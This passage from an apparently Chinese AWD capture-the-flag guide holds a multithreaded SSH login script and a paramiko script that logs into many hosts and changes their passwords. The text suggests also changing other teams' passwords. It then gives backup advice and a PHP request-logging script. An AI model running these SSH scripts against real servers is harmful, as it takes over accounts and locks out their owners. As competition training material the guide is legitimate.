ssh_base_pwd<span class=\"token punctuation\">(</span>ip_demo<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ - ]Ip: %s\"</span> <span class=\"token operator\">%</span> ip_demo <span class=\"token operator\">+</span><span class=\"token string\">\" is Failed\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> x <span class=\"token operator\">></span> <span class=\"token number\">255</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Finshed!!!!!!!!\"</span><span class=\"token punctuation\">)</span>\n    q<span class=\"token punctuation\">.</span>task_done<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token comment\">#线程队列部分</span>\nth<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nth_num<span class=\"token operator\">=</span><span class=\"token number\">255</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>th_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        t<span class=\"token operator\">=</span>threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>main<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        th<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>th_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        th<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>th_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        th<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        \n\n<span class=\"token comment\">#q.join () 所有任务完成</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>我们改密码是为了防止被别人弱口令爆破，或者密码是默认的情况导致服务器丢失，这里我们也可以尝试去更改别人的密码</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> paramiko\n<span class=\"token keyword\">import</span> sys\n\nssh_clients <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\ntimeout <span class=\"token operator\">=</span> <span class=\"token number\">5</span>\nnew_password <span class=\"token operator\">=</span> <span class=\"token string\">\"xcxy@ncwss123\"</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">SSH_Client</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>is_root <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\n        self<span class=\"token punctuation\">.</span>host <span class=\"token operator\">=</span> host\n        self<span class=\"token punctuation\">.</span>port <span class=\"token operator\">=</span> port\n        self<span class=\"token punctuation\">.</span>username <span class=\"token operator\">=</span> username\n        self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">=</span> password\n        self<span class=\"token punctuation\">.</span>ssh <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>ssh<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>ssh<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span>timeout<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">exec_command</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        stdin<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>ssh<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> stdin<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">change_password</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        stdin<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span><span class=\"token string\">\"passwd\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>username <span class=\"token operator\">!=</span> <span class=\"token string\">\"root\"</span><span class=\"token punctuation\">:</span>\n            stdin<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span>\n        stdin<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token operator\">%</span> new_password<span class=\"token punctuation\">)</span>\n        stdin<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token operator\">%</span> new_password<span class=\"token punctuation\">)</span>\n        stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"success\"</span> <span class=\"token keyword\">in</span> stderr<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">=</span> new_password\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">save_log</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"a+\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s %s %s %s\\n\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage:\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\t python %s [FILENAME]\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    filename <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Loading file : %s\"</span> <span class=\"token operator\">%</span> filename<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span>\n            line <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span>\n            data <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n            host <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            username <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\n            password <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Trying login : %s\"</span> <span class=\"token operator\">%</span> host<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                ssh_client <span class=\"token operator\">=</span> SSH_Client<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [-] %s\"</span> <span class=\"token operator\">%</span> e<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">continue</span>\n            ssh_clients<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ssh_client<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Login finished. \"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+&#125; Got [%d] clients. \"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ssh_clients<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ssh_clients<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Starting changing password. \"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> ssh_client <span class=\"token keyword\">in</span> ssh_clients<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> ssh_client<span class=\"token punctuation\">.</span>change_password<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] %s (Success!)\"</span> <span class=\"token operator\">%</span> ssh_client<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">)</span>\n            ssh_client<span class=\"token punctuation\">.</span>save_log<span class=\"token punctuation\">(</span><span class=\"token string\">\"success.log\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] %s (Failed!)\"</span> <span class=\"token operator\">%</span> ssh_client<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] something like interesting!!! \"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"下载源码备份\"><a class=\"anchor\" href=\"#下载源码备份\">#</a> 下载源码，备份</h2>\n<p>使用 ssh 工具保留源码，复制两份，用 d 盾去扫一份<br />\n以免网站崩溃的时候无法及时恢复，导致 check 丢分</p>\n<h2 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h2>\n<p>上面提到我们将源码 down 下来后利用 d 盾等工具扫描，将爆出来的 shell 注释修改或者删除等（具体怎么改根据比赛要求）</p>\n<p>接着就是监控脚本</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'LOG_FILEDIR'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/tmp/loooooooogs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 日志文件目录</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token constant\">LOG_FILEDIR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">// 如果目录不存在则创建</span>\n\t<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token constant\">LOG_FILEDIR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 创建目录</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">&#123;</span> \n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">function_exists</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'getallheaders'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 获取所有的头信息</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 循环获取所有的头信息</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'HTTP_'</span><span class=\"token punctuation\">)</span> \n<span class=\"token variable\">$headers</span><span class=\"token punctuation\">[</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'-'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">ucwords</span><span class=\"token punctuation\">(</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'_'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 将头信息的名称替换为小写，并将下划线替换为空格</span>\n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token keyword\">return</span> <span class=\"token variable\">$headers</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token variable\">$get</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取 get 参数 </span>\n<span class=\"token variable\">$post</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取 post 参数</span>\n<span class=\"token variable\">$cookie</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取 cookie 参数</span>\n<span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取所有的头信息</span>\n<span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取所有的上传文件信息</span>\n<span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REMOTE_ADDR\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取客户端 ip</span>\n<span class=\"token variable\">$method</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_METHOD'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取请求方式</span>\n<span class=\"token variable\">$filepath</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"SCRIPT_NAME\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取文件路径</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 循环获取所有的上传文件信息</span>\n<span class=\"token variable\">$files</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取文件内容</span>\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"virink\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 写入文件</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Accept'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 删除头信息中的 Accept</span>\n<span class=\"token variable\">$input</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Get\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$get</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Post\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$post</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Cookie\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$cookie</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"File\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$files</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Header\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$header</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 将所有的参数合并成一个数组</span>\n\n<span class=\"token function\">logging</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 调用日志函数</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">logging</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 日志函数</span>\n<span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取客户端 ip</span>\n<span class=\"token variable\">$LOG_FILENAME</span> <span class=\"token operator\">=</span> <span class=\"token constant\">LOG_FILEDIR</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 日志文件路径</span>\n<span class=\"token variable\">$time</span> <span class=\"token operator\">=</span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Y-m-d G:i:s\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取当前时间</span>\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$LOG_FILENAME</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token operator\">.</span><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 写入日志文件</span>\n\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$LOG_FILENAME</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'http://'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_HOST'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_SELF'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'?'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'QUERY_STRING'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 写入日志文件</span>\n\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$LOG_FILENAME</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\r\\n***************************************************************\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 写入日志文件</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" 